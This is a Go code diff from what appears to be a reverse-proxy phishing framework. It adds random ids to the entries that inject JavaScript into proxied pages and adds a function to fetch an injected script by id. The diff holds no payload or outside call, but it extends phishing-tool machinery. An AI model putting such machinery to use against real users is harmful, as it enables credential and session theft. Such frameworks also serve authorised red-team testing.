@@ -90,6 +90,7 @@ type LoginUrl struct {
 }
 
 type JsInject struct {
+	id              string           `mapstructure:"id"`
 	trigger_domains []string         `mapstructure:"trigger_domains"`
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
 	trigger_params  []string         `mapstructure:"trigger_params"`
@@ -794,7 +795,7 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
-func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
+func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
 	for _, js := range p.js_inject {
 		host_matched := false
 		for _, h := range js.trigger_domains {
@@ -834,9 +835,25 @@ func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[str
 							script = strings.Replace(script, "{"+k+"}", v, -1)
 						}
 					}
-					return script, nil
+					return js.id, script, nil
 				}
 			}
+		}
+	}
+	return "", "", fmt.Errorf("script not found")
+}
+
+func (p *Phishlet) GetScriptInjectById(id string, params *map[string]string) (string, error) {
+	for _, js := range p.js_inject {
+		if js.id == id {
+			script := js.script
+			if params != nil {
+				for k, v := range *params {
+					script = strings.Replace(script, "{"+k+"}", v, -1)
+				}
+			}
+
+			return script, nil
 		}
 	}
 	return "", fmt.Errorf("script not found")
@@ -954,7 +971,9 @@ func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, h
 }
 
 func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
-	js := JsInject{}
+	js := JsInject{
+		id: GenRandomToken(),
+	}
 	for _, d := range trigger_domains {
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
 	}
